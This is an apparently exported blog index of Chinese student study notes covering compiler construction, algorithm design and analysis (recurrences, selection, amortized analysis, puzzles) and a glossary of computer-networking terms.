<h3 id="18-二义性文法"><a href="#18-二义性文法" class="headerlink" title="18. 二义性文法"></a>18. 二义性文法</h3><h3 id="19-预测分析中的错误恢复：恐慌模式-短语层次的恢复"><a href="#19-预测分析中的错误恢复：恐慌模式-短语层次的恢复" class="headerlink" title="19. 预测分析中的错误恢复：恐慌模式/短语层次的恢复"></a>19. 预测分析中的错误恢复：恐慌模式/短语层次的恢复</h3><h1 id="ch5-语法制导的翻译"><a href="#ch5-语法制导的翻译" class="headerlink" title="ch5 语法制导的翻译"></a>ch5 语法制导的翻译</h1><h2 id="需要掌握的问题-3"><a href="#需要掌握的问题-3" class="headerlink" title="需要掌握的问题"></a>需要掌握的问题</h2><ol>
<li>SDD和SDT的概念</li>
</ol>
<h2 id="回答-3"><a href="#回答-3" class="headerlink" title="回答"></a>回答</h2><h3 id="1-SDD和SDT的概念"><a href="#1-SDD和SDT的概念" class="headerlink" title="1. SDD和SDT的概念"></a>1. SDD和SDT的概念</h3><p>SDD：语法制导的定义</p>
<p>属性文法：没有副作用的SDD</p>
<p>S属性SDD：只包含综合属性的SDD</p>
<h3 id="2-消除左递归时语义规则的处理"><a href="#2-消除左递归时语义规则的处理" class="headerlink" title="2. 消除左递归时语义规则的处理"></a>2. 消除左递归时语义规则的处理</h3><p><img src="/2020/08/13/编译原理复习笔记/image-20200817072556985.png" alt="image-20200817072556985"></p>
<h1 id="ch6-中间代码生成"><a href="#ch6-中间代码生成" class="headerlink" title="ch6 中间代码生成"></a>ch6 中间代码生成</h1><h2 id="需要掌握的问题-4"><a href="#需要掌握的问题-4" class="headerlink" title="需要掌握的问题"></a>需要掌握的问题</h2><ol>
<li>三元式、四元式、间接三元式、静态单赋值</li>
<li>类型表达式</li>
<li>bool表达式的回填技术</li>
</ol>
<p><img src="/2020/08/13/编译原理复习笔记/image-20200817094403811.png" alt="image-20200817094403811"></p>
]]></content>
      <categories>
        <category>Compiler</category>
      </categories>
      <tags>
        <tag>Compiler</tag>
      </tags>
  </entry>
  <entry>
    <title>算法学习笔记</title>
    <url>/2019/02/10/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>本篇供日后复习，跳跃性很大，随性更新。</p>
<p>参考书目：《算法设计与分析》 黄宇 机械工业出版社</p>
<h1 id="第2章-从算法的角度重新审视数学的概念"><a href="#第2章-从算法的角度重新审视数学的概念" class="headerlink" title="第2章 从算法的角度重新审视数学的概念"></a>第2章 从算法的角度重新审视数学的概念</h1><h3 id="2-1-3-阶乘n"><a href="#2-1-3-阶乘n" class="headerlink" title="2.1.3 阶乘n!"></a>2.1.3 阶乘n!</h3><p>根据<code>Stirling公式</code>，可以将<code>n!</code>转化为更易于处理的闭形式，对<code>n&gt;=1</code>，有：</p>
<script type="math/tex; mode=display">\sqrt{2\pi n}(\frac{n}{e})^n < n! < \sqrt{2\pi n}(\frac{n}{e})^n(1+\frac{1}{11n})</script><p><code>Stirling公式</code>也可以写成：</p>
<script type="math/tex; mode=display">n! = \sqrt{2\pi n}(\frac{n}{e})^n e^{\varepsilon(n)},其中\frac{1}{12n+1} \leq \varepsilon(n) \leq \frac{1}{12n}</script><p>写成近似形式：</p>
<script type="math/tex; mode=display">n! = \sqrt{2\pi n}(\frac{n}{e})^n(1+\Theta(\frac{1}{n}))</script><p>由于 $\Theta(\frac{1}{n})$ 是无穷小量，$\lim\limits_{n \to \infty} \frac{1}{n}=0$ ，忽略。所以得到进一步的近似式：</p>
<script type="math/tex; mode=display">n! \approx \sqrt{2\pi n}(\frac{n}{e})^n</script><h3 id="2-1-4-常见级数求和-sum-limits-i-1-n-f-i"><a href="#2-1-4-常见级数求和-sum-limits-i-1-n-f-i" class="headerlink" title="2.1.4 常见级数求和 $\sum\limits_{i=1}^{n}f(i)$"></a>2.1.4 常见级数求和 $\sum\limits_{i=1}^{n}f(i)$</h3><ul>
<li>多项式级数(polynomial series)<br>  $ \sum\limits_{i=1}^{n}i = \dfrac{n(n+1)}{2} $<br>  .<br>  $ \sum\limits_{i=1}^{n}i^2 = \dfrac{1}{3}n(n+\dfrac{1}{2})(n+1) $<br>  .<br>  $ \sum\limits_{i=1}^{n}i^k = \Theta(\dfrac{1}{k+1}n^{k+1}) $<br>  .</li>
<li>几何级数(geometric series)<br>  $ \sum\limits_{i=0}^{k}ar^i = a(\dfrac{r^{k+1}-1}{r-1}) $</li>
</ul>
<p>测试用<br>$\begin{eqnarray}f(x,y)<br>    &amp;=&amp;2xy+(x-y)^2\\<br>    &amp;=&amp;x^2+y^2<br>\end{eqnarray}$</p>
<h1 id="第0章-概论"><a href="#第0章-概论" class="headerlink" title="第0章 概论"></a>第0章 概论</h1><h2 id="杂记"><a href="#杂记" class="headerlink" title="杂记"></a>杂记</h2><p>Q1: 在数组中找最大元素和最小元素</p>
<p>A1: 最优：n为偶数时，将数组切分为($a_0$,$a_1$)($a_2$,$a_3$)…($a_{n-2}$, $a_{n-1}$)，组内比较后分出胜者组和败者组，胜者组遍历一遍得到最大元素，败者组遍历一遍得到最小元素。n为奇数时先抛开最后一个元素，最后额外比较一下。</p>
<hr>
<p>Q2: 比较3匹马的预测性</p>
<p>A2: 将马的过去两百场比赛进行huffman编码，所用字符最少的马预测性越强，原理是信息熵。</p>
<hr>
<p>Q3: 停机问题</p>
<p>A3: 不可判定，假设有程序terminate(p:program, x:input)能判断对于程序p，给一个输入x，p是否会终止（即判定p(x)是否终止），那么定义程序paradox(z:file)<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">paradox(z:file):</span><br><span class="line">    <span class="number">1</span>: <span class="keyword">if</span>(terminate(z, z)) <span class="keyword">goto</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure></p>
<p>paradox(z)的执行结果为</p>
<script type="math/tex; mode=display">
\left\{
\begin{array}{aligned}
z(z)不终止   &&  {paradox(z)终止}\\
z(z)终止     &&  {paradox(z)不终止}\\
\end{array} \right.</script><p>此时，paradox(paradox)便成为矛盾体</p>
<script type="math/tex; mode=display">
\left\{
\begin{array}{aligned}
paradox(paradox)不终止 &&   {paradox(paradox)终止}\\
paradox(paradox)终止   &&   paradox(paradox)不终止
\end{array} \right.</script><h2 id="课程任务："><a href="#课程任务：" class="headerlink" title="课程任务："></a>课程任务：</h2><p>书面作业15%（8次，准备2个作业本）<br>编程15%（6-8次，每次2-4题，时间2-3周）<br>期中20%<br>期末50%</p>
<h1 id="第1章-概论"><a href="#第1章-概论" class="headerlink" title="第1章 概论"></a>第1章 概论</h1><p>《proof without words》中的有趣证明？</p>
<p>double counting 思想用于证明</p>
<h2 id="平均复杂度"><a href="#平均复杂度" class="headerlink" title="平均复杂度"></a>平均复杂度</h2><p>$ \sum\limits_{i=1}^{n}Pr(i)I(i) $</p>
<h2 id="算法的最优性"><a href="#算法的最优性" class="headerlink" title="算法的最优性"></a>算法的最优性</h2><p>如果一个算法的最坏情况等于问题的下界，那么这个算法是最优的。</p>
<h1 id="第2讲-渐进时间复杂度"><a href="#第2讲-渐进时间复杂度" class="headerlink" title="第2讲 渐进时间复杂度"></a>第2讲 渐进时间复杂度</h1><p>$ log_{n}, n^\alpha, c^n, n!, n^n $</p>
<script type="math/tex; mode=display">
\lim\limits_{n\to \infty}\frac{f(n)}{g(n)}=c,
\left\{
\begin{array}{aligned}
c=0 &&  f=o(g)\\
0 \leq c < \infty   && f=O(g)\\
0 < c < \infty      && f=\Theta(g)\\
0 < c \leq \infty   && f=\Omega(g)\\
c = \infty          && f=\omega(g)
\end{array} \right.</script><p>不是所有俩函数之间都有上述五种关系，比如$ f(n)=n, g(n)=n^{1+sin n}$，极限不存在。</p>
<h2 id="决策树"><a href="#决策树" class="headerlink" title="决策树"></a>决策树</h2><p>决策树的高度p是问题的lower bound，基于比较的决策树节点数为n，有$ n \leq 2^{p-1} $，所以$ p &gt;= lgn $，所以查找问题的lower bound为$lgn$，二分查找是最优算法。</p>
<p>无关思考题：圆的内接八边形，边长4个2，4个3，求八边形面积。<br>放到正方形里去，减去四个角的等腰直角三角形</p>
<script type="math/tex; mode=display">
f(n) =
\begin{cases}
n/2,  & \text{if $n$ is even}\\
3n+1, & \text{if $n$ is odd}
\end{cases}</script><h1 id="第3讲-递归"><a href="#第3讲-递归" class="headerlink" title="第3讲 递归"></a>第3讲 递归</h1><p>时间复杂度计算</p>
<h3 id="齐次线性"><a href="#齐次线性" class="headerlink" title="齐次线性"></a>齐次线性</h3><p>$ a_n = r_1a_{n-1} + r_2a_{n-2} + … + r_ma_{n-k} $</p>
<p>特例<br>$ 形如T(n)=r_1T(n-1)+r_2T(n-2),有特征方程x^2 = r_1x + r_2x $<br>$ 则T(n) = ux_1^n + vx_2^n. $</p>
<p>证明：<br>$ B.C: T(1), T(2) $</p>
<p>$ I.H: 1 \leq m &lt; n, T(m) = ux_1^m + vx_2^m $</p>
<p>$\begin{eqnarray}T(n)<br>    &amp;=&amp; ux_1^n+vx_2^n\\<br>    &amp;=&amp; ux_1^{n-2}x_1^2+vx_2^{n-2}x_2^2\\<br>    &amp;=&amp; ux_1^{n-2}(r_1x_1+r_2)+vx_2^{n-2}(r_1x_2+r_2)\\<br>    &amp;=&amp; r_1(ux_1^{n-1}+vx_1^{n-2})+r_2(ux_1^{n-2}+vx2^{n-2})\\<br>    &amp;=&amp; r_1T(n-1)+r_2T(n-2)<br>\end{eqnarray}$</p>
<p>代价 = 递归代价 + 非递归代价</p>
<p>$ T(n) = bT(\frac{n}{c})+f(n) $</p>
<p>after $k$ th expansion</p>
<p>$ T(n) = b^kT(\frac{n}{c^k})+\sum\limits_{i=1}^{k}f(\frac{n}{c^{i-1}}) $</p>
<p>意味着递归树高度$\log_c n$</p>
<script type="math/tex; mode=display">
\sum\limits_{i=0}^{n-1}=
\begin{cases}
n/2, \text{xxx} \\
ss
\end{cases}</script><h2 id="最大子序列之和"><a href="#最大子序列之和" class="headerlink" title="最大子序列之和"></a>最大子序列之和</h2><ol>
<li>暴力枚举<br> 算法：取所有sequence[i, j]，比较。<br> 时间复杂度：$O(n^3)$</li>
<li>减少重复计算</li>
<li>二分，最长要么在左，要么在右，要么有左有右</li>
<li><p>假设A[0, n]中最大和为M[0, n]，那么A[0, n+1]中最大和为$\max\{M[0,n], \sum\limits_{i=0}^{n}A_i, \sum\limits_{i=1}^{n}A_i, …,\sum\limits_{i=n-1}^{n}, A_n\}$</p>
<p> 当前和一直加，保持增长，如果小于0，就丢弃前面的（即丢弃当前和）</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ThisSum = MaxSum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; N; j++) &#123;</span><br><span class="line">    ThisSum += A[j];</span><br><span class="line">    <span class="keyword">if</span>(ThisSum &gt; MaxSum) &#123;</span><br><span class="line">        MaxSum = ThisSum;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(ThisSum &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        ThisSum = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> MaxSum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="一个盘子可以被n个直线最多分为多少块"><a href="#一个盘子可以被n个直线最多分为多少块" class="headerlink" title="一个盘子可以被n个直线最多分为多少块"></a>一个盘子可以被n个直线最多分为多少块</h2><p>L(0) = 1<br>L(n) = L(n-1) + n</p>
<h2 id="合法字符串"><a href="#合法字符串" class="headerlink" title="合法字符串"></a>合法字符串</h2><p>字符串只有abc三种字符，aa不允许出现，长度为n的合法字符串有多少个</p>
<p>f(1) = 3<br>f(2) = 8<br>str(n)  : ab+str(n-2)<br>        : ac+str(n-2)<br>        : b+str(n-1)<br>        : c+str(n-1)<br>f(n) = 2f(n-1)+2f(n-2)</p>
<h2 id="矩阵乘法"><a href="#矩阵乘法" class="headerlink" title="矩阵乘法"></a>矩阵乘法</h2><p>strassen’s alogorithm runs in $O(n^{2.81})$</p>
<p>f(n) = 7f(n/2) + $\Theta(n^2)$</p>
<h1 id="第4讲-quick-sort"><a href="#第4讲-quick-sort" class="headerlink" title="第4讲 quick sort"></a>第4讲 quick sort</h1><p>易合难分</p>
<p>partition的方法不同<br>最坏复杂度分析<br>平均复杂度分析</p>
<h1 id="第5讲-merge-sort"><a href="#第5讲-merge-sort" class="headerlink" title="第5讲 merge sort"></a>第5讲 merge sort</h1><p>易分难合</p>
<h1 id="第6讲-heap-sort"><a href="#第6讲-heap-sort" class="headerlink" title="第6讲 heap sort"></a>第6讲 heap sort</h1><h2 id="common-version"><a href="#common-version" class="headerlink" title="common version"></a>common version</h2><h2 id="accelerated-heap-sort"><a href="#accelerated-heap-sort" class="headerlink" title="accelerated heap sort"></a>accelerated heap sort</h2><h1 id="第7讲-选择"><a href="#第7讲-选择" class="headerlink" title="第7讲 选择"></a>第7讲 选择</h1><h2 id="找最大最小元素"><a href="#找最大最小元素" class="headerlink" title="找最大最小元素"></a>找最大最小元素</h2><h2 id="找第2大元素"><a href="#找第2大元素" class="headerlink" title="找第2大元素"></a>找第2大元素</h2><h2 id="找第k大-小元素"><a href="#找第k大-小元素" class="headerlink" title="找第k大/小元素"></a>找第k大/小元素</h2><h2 id="找中位数"><a href="#找中位数" class="headerlink" title="找中位数"></a>找中位数</h2><p>算法1：</p>
<ol>
<li>寻找 pivot，将数组分两半，在基数比较大的一半里找第 n/2 - |S小| - 1 小的元素<br>最坏情况：<br>类似快排，pivot选不好</li>
</ol>
<p>6次比较找出5个元素中的中位数：</p>
<p>算法2：</p>
<h1 id="第8讲-adversary-amp-BST"><a href="#第8讲-adversary-amp-BST" class="headerlink" title="第8讲 adversary &amp; BST"></a>第8讲 adversary &amp; BST</h1><h2 id="判断5个元素中是否有3个连续的1"><a href="#判断5个元素中是否有3个连续的1" class="headerlink" title="判断5个元素中是否有3个连续的1"></a>判断5个元素中是否有3个连续的1</h2><p>3次之内不够<br>对手策略：定义 x: 1 1 1 1 1, y: 0 0 0 0 0，我想看第i位的值，就先去 x 里看，如果把 xi 变成0还能保证有3个连续1，那么把 xi 变成0，否则把 yi 变成1.</p>
<p>4次：</p>
<h2 id="判断图的连通性"><a href="#判断图的连通性" class="headerlink" title="判断图的连通性"></a>判断图的连通性</h2><p>必须看$\frac{n(n-1)}{2}$次，否则<br>对手策略：</p>
<p>性质的单调性：图有这个性质，它的子图也有这个性质</p>
<p>图可平面化：图在平面上可以画出边不相交，条件是不含 K3,3 和 K5 这两个子图</p>
<h2 id="二分搜索"><a href="#二分搜索" class="headerlink" title="二分搜索"></a>二分搜索</h2><p>例如求$\sqrt{N}$<br>当 N 很大时，等于是找 x，使得 $ x^2 \leq N, (x+1)^2 &gt; N $</p>
<h2 id="AVL-tree"><a href="#AVL-tree" class="headerlink" title="AVL tree"></a>AVL tree</h2><h2 id="RB-tree"><a href="#RB-tree" class="headerlink" title="RB tree"></a>RB tree</h2><h2 id="搜索的-tutorial"><a href="#搜索的-tutorial" class="headerlink" title="搜索的 tutorial"></a>搜索的 tutorial</h2><h3 id="扔鸡蛋问题"><a href="#扔鸡蛋问题" class="headerlink" title="扔鸡蛋问题"></a>扔鸡蛋问题</h3><p>Q: n 层楼，从某层楼扔下去鸡蛋会碎，求这个楼层</p>
<ol>
<li>如果只有1个鸡蛋，easy</li>
<li>如果有无穷多个鸡蛋，二分法</li>
<li>如果有2个鸡蛋<br>A1: 每隔$\sqrt(n)$层扔1个鸡蛋，尝试次数为$\sqrt(n) ~ 2\sqrt(n)$<br>A2: 第1次，从x层扔（碎了，最坏比x次，没碎继续），第2次从2x-1层扔（碎了，比1+x-1次，没碎继续），。。。共 (x+1)x/2 层，令它 &gt;=n 就求得了 x</li>
</ol>
<h3 id="找名人"><a href="#找名人" class="headerlink" title="找名人"></a>找名人</h3><p>Q: n 个人，名人定义：被其他所有人认识，但不认识其他任何人，操作是拿A和B来，问A是否认识B，B是否认识A<br>O(n)算法：每次比较可以淘汰1个人</p>
<h3 id="赛马问题"><a href="#赛马问题" class="headerlink" title="赛马问题"></a>赛马问题</h3><p>Q: 共25匹马，每次可以选5匹马进行比赛，并得到次序（无法计时），问至少要多少次比赛才能确定跑的 最快、第二快、第三块的马</p>
<p>最快的：比赛6次即可<br>第二快：出现在第1快的那一组的第2名（1匹），以及所有组第一快里的那5匹里输给第1快的第2名（1匹）（只输给最大元素的元素是候选人）。<br>第三快：候选人，第1组第3快，第2组第2快，第3组第一快</p>
<p>共7次找出前三快的马</p>
<h3 id="2018-mid-term"><a href="#2018-mid-term" class="headerlink" title="2018 mid-term"></a>2018 mid-term</h3><p>Q: 有sort5算法，一次排序5个元素，求n个元素的最大值和第二大</p>
<p>最大值：一次sort5丢弃4个元素，所以最多比较$\frac{n-1}{4}$取上整</p>
<p>第二大：采用5叉胜者树，即可得出 max，和仅仅输给 max 的元素</p>
<h3 id="带权中位数"><a href="#带权中位数" class="headerlink" title="带权中位数"></a>带权中位数</h3><p>Q: 所有权之和为1，带权中位数$ x_k: \sum_{x_i &lt; x_k}{w_i} &lt; 1/2 且 \sum_{x_i &gt; x_k}{w_i} \leq 1/2 $<br>A: 找普通中位数，判断行不行，小不行就将小于它的权和加到它头上，然后递归后半部，大不行就同理</p>
<h3 id="最小未出现自然数"><a href="#最小未出现自然数" class="headerlink" title="最小未出现自然数"></a>最小未出现自然数</h3><p>n个大小不同的自然数E[1]~E[n]，找出不在这个自然数序列中出现的最小自然数</p>
<ol>
<li>若已排序，二分查找，若E[n/2]&gt;n/2，在前一半，若等于，在后一半，不可能小于..</li>
<li>若未排序，<br>法1：开n位数组，遍历，出现置1，然后第一个0元素下标就是<br>法2：找中位数x，按x和n/2大小丢掉一半元素</li>
</ol>
<h3 id="前k大的数们"><a href="#前k大的数们" class="headerlink" title="前k大的数们"></a>前k大的数们</h3><ol>
<li>排序，取后k个，nlogn</li>
<li>建堆+取出k个元素，n+klogn</li>
<li>先找第k大元素，n，再遍历找出比第k大都大的元素，n，然后排序，klogk，合计 n+klogk</li>
</ol>
<h3 id="两个已排序数组中的第k小元素-LeetCode"><a href="#两个已排序数组中的第k小元素-LeetCode" class="headerlink" title="两个已排序数组中的第k小元素 LeetCode-"></a>两个已排序数组中的第k小元素 LeetCode-</h3><ol>
<li>merge到第k个就行，$\Theta(k)$</li>
<li>找两数组中位数A[m/2], B[n/2]<br>若 m/2+n/2 &lt; k，若A[m/2] &gt; B[n/2]，说明比B[n/2]小的元素数量[n/2, m/2+n/2]，所以确定比B小的B的前半部分可以丢了<pre><code>         若       &lt; ，丢A的前半部分
</code></pre></li>
</ol>
<h3 id="5个元素6次比较找中位数讲过了，7次比较排序"><a href="#5个元素6次比较找中位数讲过了，7次比较排序" class="headerlink" title="5个元素6次比较找中位数讲过了，7次比较排序"></a>5个元素6次比较找中位数讲过了，7次比较排序</h3><p>ppt</p>
<h3 id="k个已排序树组-merge-策略"><a href="#k个已排序树组-merge-策略" class="headerlink" title="k个已排序树组 merge 策略"></a>k个已排序树组 merge 策略</h3><p>两两merge</p>
<h2 id="哈希表"><a href="#哈希表" class="headerlink" title="哈希表"></a>哈希表</h2><p>简单一致哈希假设</p>
<h2 id="并查集"><a href="#并查集" class="headerlink" title="并查集"></a>并查集</h2><h2 id="均摊时间代价"><a href="#均摊时间代价" class="headerlink" title="均摊时间代价"></a>均摊时间代价</h2><h3 id="accounting-cost"><a href="#accounting-cost" class="headerlink" title="accounting cost"></a>accounting cost</h3><p>这个真不会，[UST]</p>
<p>一般是对一系列操作进行分析才使用均摊分析，分析出一次操作的代价，而且这些操作是由规律的</p>
<p>accounting cost 之和必须大于0，这样计算出的 amortized cost 是 actual cost 的一个上界</p>
<h4 id="二-计数器-ppt上的"><a href="#二-计数器-ppt上的" class="headerlink" title="二-计数器 ppt上的"></a>二-计数器 ppt上的</h4><p>发现：一开始每一位都是0，<br>每一位想要从1变为0，首先得从0变为1，于是把0-&gt;1的accost 为1，1-&gt;0的ac cost为-1，这样 ac cost 始终大于0</p>
<h3 id="聚合法"><a href="#聚合法" class="headerlink" title="聚合法"></a>聚合法</h3><p>比如作业那个 三-计数器，个位每次变，十位每3次变，百位每9次变。。所以操作n次increment，变了n+n/3+n/3^2+…. &lt; 2n</p>
<p>栈的pop，multipop，可见每次操作</p>
<h3 id="势能法？potential-method"><a href="#势能法？potential-method" class="headerlink" title="势能法？potential method"></a>势能法？potential method</h3><h2 id="统一-hash"><a href="#统一-hash" class="headerlink" title="统一 hash"></a>统一 hash</h2><p>解决类似快排 partition 没选好的问题，快排随机选 pivot</p>
<h1 id="期中考试讲解"><a href="#期中考试讲解" class="headerlink" title="期中考试讲解"></a>期中考试讲解</h1><ol>
<li><p>根节点到最深节点的路径长度就是基于比较的排序的最坏情况</p>
</li>
<li><p>(2) 逆序对的情况只能是 (i,i+1) (j, j+1)  或 (i, i+2) (i, i+1) 或 (i, i+2) (i+1,i+2) </p>
</li>
<li><p>(2) 看 tutorial，找中位数，如果满足直接返回，不满足就把某一半边的权重加到中位数上，然后继续递归另一半边</p>
</li>
<li><p>其实链表就可以了？删除时的代价n在插入时每次 accounting cost 预付掉，然后就是常数级别的了</p>
</li>
</ol>
]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title>计网名词小结</title>
    <url>/2020/07/10/%E8%AE%A1%E7%BD%91%E5%90%8D%E8%AF%8D%E5%B0%8F%E7%BB%93/</url>
    <content><![CDATA[<p>计网名词小结</p>
<h1 id="第1章-简介"><a href="#第1章-简介" class="headerlink" title="第1章 简介"></a>第1章 简介</h1><h2 id="1-2-网络边缘"><a href="#1-2-网络边缘" class="headerlink" title="1.2 网络边缘"></a>1.2 网络边缘</h2><p>DSL: digital subscriber line 数字用户线</p>
<p>FTTH: fiber to the home 到户光纤</p>
<p>HFC: hybrid fiber coax 混合光纤同轴 p10</p>
<p>WIFI: 无线 LAN (54Mbps)</p>
<p>接入网络的途径：</p>
<ol>
<li>住宅接入: DSL, 电缆, FTTH, 拨号, 卫星</li>
<li>公司接入: 以太网, wifi</li>
<li>广域无线接入: 3g, LTE</li>
</ol>
<h2 id="1-3-网络核心"><a href="#1-3-网络核心" class="headerlink" title="1.3 网络核心"></a>1.3 网络核心</h2><p>FDM: frequence-division multiplexing 频分复用</p>
<p>TDM: time-division multiplexing 时分复用</p>
<p>IXP: internet exchange point 因特网交换点</p>
<h1 id="第5章-链路层"><a href="#第5章-链路层" class="headerlink" title="第5章 链路层"></a>第5章 链路层</h1><h2 id="5-2-纠错"><a href="#5-2-纠错" class="headerlink" title="5.2 纠错"></a>5.2 纠错</h2><p>FEC: forward error correction 前向纠错</p>
<p>CRC: cyclic redundancy check 循环冗余校检测</p>
<p>检测方法：</p>
<ol>
<li>奇偶校验</li>
<li>checksum 的计算</li>
<li>CRC 的 R 的计算</li>
</ol>
<h2 id="5-2-多路访问链路和协议"><a href="#5-2-多路访问链路和协议" class="headerlink" title="5.2 多路访问链路和协议"></a>5.2 多路访问链路和协议</h2><h3 id="信道划分协议"><a href="#信道划分协议" class="headerlink" title="信道划分协议"></a>信道划分协议</h3><p>TDM, FDM: 单个节点只能享受 R/N 的传输速率</p>
<p>CDMA: code division multiple access: 每个节点单独编码，可同时传输</p>
<h3 id="随机接入协议"><a href="#随机接入协议" class="headerlink" title="随机接入协议"></a>随机接入协议</h3><p>每个节点全速 R 发送，撞了等会再重传</p>
<p>时隙 Aloha</p>
<p>Aloha</p>
<p>CSMA</p>
<p>CSMA/CD</p>
<h3 id="轮流协议"><a href="#轮流协议" class="headerlink" title="轮流协议"></a>轮流协议</h3><p>轮询, 令牌</p>
<h2 id="5-4-以太网"><a href="#5-4-以太网" class="headerlink" title="5.4 以太网"></a>5.4 以太网</h2><p>数据报长度必须 46-1500 字节</p>
<h1 id="第6章-无线网"><a href="#第6章-无线网" class="headerlink" title="第6章 无线网"></a>第6章 无线网</h1><h2 id="6-2-无线链路"><a href="#6-2-无线链路" class="headerlink" title="6.2 无线链路"></a>6.2 无线链路</h2><p>SNR: signal-to-noise ratio 信噪比</p>
<p>BER: bit error ration 比特差错率</p>
<p>SNR(x)-BER(y) 变化图</p>
<h2 id="6-3-802-11"><a href="#6-3-802-11" class="headerlink" title="6.3 802.11"></a>6.3 802.11</h2><p>BSS: basic service set 基本服务集（由多个无线站点 和 一个 AP 作为中心基站组成） p350</p>
<p>AP: access point 接入点</p>
<p>SSID: service set identifier 服务集标识符</p>
<p>CSMA/CA: CSMA/ collision avoidance</p>
<p>SIFS: short inter-frame spacing 短帧间间隔</p>
<p>DIFS: distributed inter-frame space 分布式帧间间隔</p>
<p>RTS: request to send 请求发送帧</p>
<p>CTS: clear to send 允许发送帧</p>
<p>链路层确认：</p>
<ul>
<li>发送方：<ol>
<li>有包就发</li>
</ol>
</li>
<li>接收方<ol>
<li>收到一个通过 CRC 校验的包</li>
<li>等待 SIFS 时间</li>
<li>回一个确认帧</li>
</ol>
</li>
<li>发送方：<ol>
<li>收到确认帧，ok</li>
<li>没收到，过一段时间，重发，直到收到</li>
<li>没收到若干次，放弃</li>
</ol>
</li>
</ul>
<p>CSMA/CA：p354</p>
<ul>
<li>发送方：<ol>
<li>监听信道，若空闲，等 DIFS，再发，期间监听信道</li>
<li>若忙碌，选择随机回退值，期间监听信道，若空闲则递减该值，若忙碌则冻结</li>
<li>回退值减到0，就发</li>
<li>如果收到确认帧，就回到第2步，并从更大范围选择随机回退值</li>
</ol>
</li>
</ul>
<p>发大数据前:</p>
<ol>
<li>RTS</li>
<li>CTS</li>
<li>DATA</li>
<li>ACK</li>
</ol>
<p>没收到 CTS 说明也撞了，不给你分配时间</p>
<h2 id="6-3-6-蓝牙-zigbee"><a href="#6-3-6-蓝牙-zigbee" class="headerlink" title="6.3.6 蓝牙 zigbee"></a>6.3.6 蓝牙 zigbee</h2><p>WPAN: wireless personal area network 无线个人区域网络</p>
<p>802.15.1, 4Mbps, 自组织皮可网, 8个活动设备, 1主7从</p>
<p>802.14.5, 20 40 100 250kbps, 控制器(主)+n从, TDM, 信标帧+活跃周期帧</p>
<h2 id="6-4-蜂窝3g"><a href="#6-4-蜂窝3g" class="headerlink" title="6.4 蜂窝3g"></a>6.4 蜂窝3g</h2><p>GSM: groupe special mobile 全球移动通信系统</p>
<p>BTS: base transceiver station 收发基站, 部署于每个六边形小区内或边界</p>
<p>BSC: basestation contoller 基站控制器</p>
<p>MSC: mobile switching center 移动交换中心</p>
<p>3GPP: 3rd generation partnership project 第三代合作伙伴项目</p>
<p>UMTS: universal movile telecommunications service 通用移动通信服务</p>
<h1 id="第4章-网络层"><a href="#第4章-网络层" class="headerlink" title="第4章 网络层"></a>第4章 网络层</h1><p>提供的服务 p205-206</p>
<p>三种协议：</p>
<ol>
<li>IP 协议</li>
<li>ICMP 协议</li>
<li>路由选择协议</li>
</ol>
<h2 id="ipv4"><a href="#ipv4" class="headerlink" title="ipv4"></a>ipv4</h2><p>flags(3 bits) R/D/M</p>
<ul>
<li>001 表示还有后续分片</li>
</ul>
<p>fragment offset * 8 = real offset</p>
<h2 id="4-2-虚电路和数据报网络"><a href="#4-2-虚电路和数据报网络" class="headerlink" title="4.2 虚电路和数据报网络"></a>4.2 虚电路和数据报网络</h2><p>VC: virtual circuit 虚电路，无连接</p>
<p>datagram network 数据报网络，有连接</p>
<h2 id="4-3-路由器原理"><a href="#4-3-路由器原理" class="headerlink" title="4.3 路由器原理"></a>4.3 路由器原理</h2><p>HOL: head-of-the-time-line 线路前部阻塞, 输入队列中排在后面的被排在前面的阻塞</p>
<p>交换的三种方式</p>
<ul>
<li>经内存交换：类似 I-&gt;CPU-&gt;O, 两次占用系统总线</li>
<li>经总线交换：类似单车道，一次只能跑一辆车</li>
<li>经互联网络交换：纵横线，控制器控制哪些交点开闭，可以并行</li>
</ul>
<h2 id="4-4-IP-编址"><a href="#4-4-IP-编址" class="headerlink" title="4.4 IP 编址"></a>4.4 IP 编址</h2><p>CIDR: classless interdomain routing 无类别域间路由选择</p>
<p>NAT 通过 NAT 表完成内部主机(内部 ip, port) &lt;=&gt; NAT 路由器(公网 ip, port) 的转换</p>
<h2 id="4-5-路由选择算法"><a href="#4-5-路由选择算法" class="headerlink" title="4.5 路由选择算法"></a>4.5 路由选择算法</h2><p>AS: autonomous system 自治系统</p>
<p>分类</p>
<ul>
<li>全局式 vs 分布式</li>
<li>静态 vs 动态</li>
<li>负载敏感 vs 负载迟钝</li>
</ul>
<p>LS 算法：</p>
<ul>
<li>基于 Dijkstra</li>
</ul>
<p>DV 算法：</p>
<ul>
<li>每个节点维护一张 N*N 的距离矩阵（N 个行向量）</li>
<li>初始化自己的那一行为 c(u, v)</li>
<li>向邻居们广播自己的那一行</li>
<li>(收到邻居的广播后，覆盖邻居的那一行)/(链路费用变化时)，然后重新计算自己的那一行 d(x, y) = min{c(x, w), d(w, y)}</li>
<li>如果自己那一行有变化，就向邻居们广播自己的那一行，没变化就静止等邻居以后的广播</li>
</ul>
<p>毒性逆转：<br>如果 z 经过 y 作为第一跳到达 x，那么 z 告诉 y：d(z, x) = +INF，即我打你这过，你别再给我整回来了</p>
<p>毒性逆转对三个以上结点无效：<br><a href="https://blog.csdn.net/tianlongtc/article/details/80261581" target="_blank" rel="noopener">https://blog.csdn.net/tianlongtc/article/details/80261581</a></p>
<p>域间路由<br>热土豆路由选择：当 AS 内部某路由器 R 发往外部网络 x 的包可以通过多个网关路由器丢出去时，选 AS 内部路由费用最低的</p>
